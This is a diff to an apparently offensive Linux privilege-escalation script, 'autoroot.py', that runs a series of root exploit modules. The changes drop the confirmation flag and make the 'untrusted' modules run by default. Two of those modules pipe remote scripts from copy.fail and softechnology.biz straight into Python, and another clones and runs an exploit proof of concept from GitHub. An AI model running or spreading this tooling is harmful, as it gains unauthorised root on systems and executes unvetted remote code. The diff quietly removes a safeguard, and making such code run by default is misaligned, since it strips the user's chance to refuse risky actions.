@@ -9,9 +9,9 @@ cannot elevate the parent shell.  Run it on a disposable lab VM.
 
 Usage:
   python3 autoroot.py --list
-  python3 autoroot.py --yes
-  python3 autoroot.py --yes --only pwnkit
-  python3 autoroot.py --yes --allow-untrusted --labs
+  python3 autoroot.py
+  python3 autoroot.py --only pwnkit
+  python3 autoroot.py --no-untrusted
 """
 
 import argparse
@@ -52,6 +52,8 @@ LOG_FH = None
 
 ENC = (getattr(sys.stdout, "encoding", "") or "").lower()
 UTF8 = "utf" in ENC
+PYEXE = shlex.quote(sys.executable or "python3")
+SELF = ""
 
 
 def _u(uni, ascii_):
@@ -96,6 +98,15 @@ def info(text: str) -> str:
 
 def dim(text: str) -> str:
     return paint(text, "38;5;244")
+
+
+def rerun(*extra):
+    """A command that actually re-runs this copy of the script."""
+    if SELF and os.path.exists(SELF):
+        parts = [PYEXE, shlex.quote(SELF)]
+    else:
+        parts = [PYEXE, "autoroot.py"]
+    return " ".join(parts + list(extra))
 
 
 def brand_rows():
@@ -755,7 +766,7 @@ def m_ovswrap():
         log(warn("      Open vSwitch yok"))
         return False
     sh("git clone --depth 1 https://github.com/manizada/OVSwrap.git ovswrap", "clone")
-    sh("python3 ovswrap-poc.py", "run", cwd=os.path.join(WORK, "ovswrap"))
+    sh(f"{PYEXE} ovswrap-poc.py", "run", cwd=os.path.join(WORK, "ovswrap"))
     return True
 
 
@@ -1320,19 +1331,14 @@ def m_3490():
 
 @module("untrusted_copyfail", "copy.fail remote script", "UNTRUSTED", untrusted=True)
 def m_copyfail():
-    if not UNTRUSTED:
-        log(warn("      untrusted; use --allow-untrusted"))
-        return False
-    sh("curl -fsSL https://copy.fail/exp | python3", "run remote payload")
+    sh(f"curl -fsSL https://copy.fail/exp | {PYEXE}", "run remote payload")
     return True
 
 
 @module("untrusted_softechnology", "softechnology.biz remote script", "UNTRUSTED", untrusted=True)
 def m_softechnology():
-    if not UNTRUSTED:
-        log(warn("      untrusted; use --allow-untrusted"))
-        return False
-    sh("curl -fsSL https://softechnology.biz/raw/OzJAt2aCfQ | python3", "run remote payload")
+    sh("curl -fsSL https://softechnology.biz/raw/OzJAt2aCfQ | " + PYEXE,
+       "run remote payload")
     return True
 
 
@@ -1491,7 +1497,7 @@ def run_module(mod: Module) -> None:
     global CAPTURE
     if mod.untrusted and not UNTRUSTED:
         mod.skipped = True
-        mod.reason = "untrusted (use --allow-untrusted)"
+        mod.reason = "disabled by --no-untrusted"
         _show_status(mod)
         return
     if mod.post and not root():
@@ -1565,8 +1571,7 @@ def run_module(mod: Module) -> None:
         if suid:
             print("      " + info("root now: %s -p" % suid[0]), flush=True)
         else:
-            print("      " + info("interactive shell: --raw --only " + mod.key),
-                  flush=True)
+            print("      " + info(rerun("--raw", "--only", mod.key)), flush=True)
     if root():
         print(ok("      current process is root"), flush=True)
         if sys.stdin.isatty():
@@ -1592,8 +1597,10 @@ def main(argv=None) -> int:
     p.add_argument("--color", choices=("auto", "always", "never"),
                    default="auto",
                    help="ANSI color output (default: auto)")
+    p.add_argument("--no-untrusted", action="store_true",
+                   help="skip the two remote curl|python3 payloads")
     p.add_argument("--allow-untrusted", action="store_true",
-                   help="allow curl | python3 payloads from unknown hosts")
+                   help=argparse.SUPPRESS)
     p.add_argument("--labs", action="store_true",
                    help="include lab/service modules (docker etc.)")
     p.add_argument("--only", help="run a single module key")
@@ -1603,7 +1610,10 @@ def main(argv=None) -> int:
                    help=f"per-command timeout (default: {TIMEOUT}s, 0 = none)")
     args = p.parse_args(argv)
 
-    global COLOR, VERBOSE, RAW
+    global COLOR, VERBOSE, RAW, SELF
+    arg0 = sys.argv[0] if sys.argv else ""
+    if arg0 and arg0 not in ("-", "-c", "<stdin>") and os.path.exists(arg0):
+        SELF = os.path.abspath(arg0)
     VERBOSE = args.verbose
     RAW = args.raw
     if args.color == "always":
@@ -1648,7 +1658,7 @@ def main(argv=None) -> int:
 
     DRY = args.dry_run
     TIMEOUT = args.timeout if args.timeout > 0 else 10 ** 9
-    UNTRUSTED = args.allow_untrusted
+    UNTRUSTED = not args.no_untrusted
     FORCE = not args.safe
     log_start()
     WORK = find_workdir()
@@ -1664,7 +1674,6 @@ def main(argv=None) -> int:
         selected = [
             m for m in selected
             if (args.labs or FORCE or not m.lab)
-            and (args.allow_untrusted or not m.untrusted)
         ]
     high = {
         "suid_gtfobins", "sudo_nopasswd", "docker_group", "lxd_group",
@@ -1736,8 +1745,7 @@ def main(argv=None) -> int:
             print("  " + dim("root now: ") + info(suid[0] + " -p"), flush=True)
         else:
             print("  " + dim("interactive: ")
-                  + info("./autoroot --raw --only " + roots[0].key),
-                  flush=True)
+                  + info(rerun("--raw", "--only", roots[0].key)), flush=True)
 
     if failed:
         section("failed")
@@ -1764,8 +1772,7 @@ def main(argv=None) -> int:
     else:
         print("  " + warn("no module proved root") + dim(
             "  a child exploit cannot elevate the parent shell"), flush=True)
-        print("  " + dim("try: ./autoroot --raw   or a SUID-shell module"),
-              flush=True)
+        print("  " + dim("try: ") + info(rerun("--raw")), flush=True)
     print("  " + dim("log: " + (LOG_PATH or "unavailable")), flush=True)
     log_write("\nrun finished: roots=%s\n"
               % (", ".join(m.key for m in roots) or "none"))
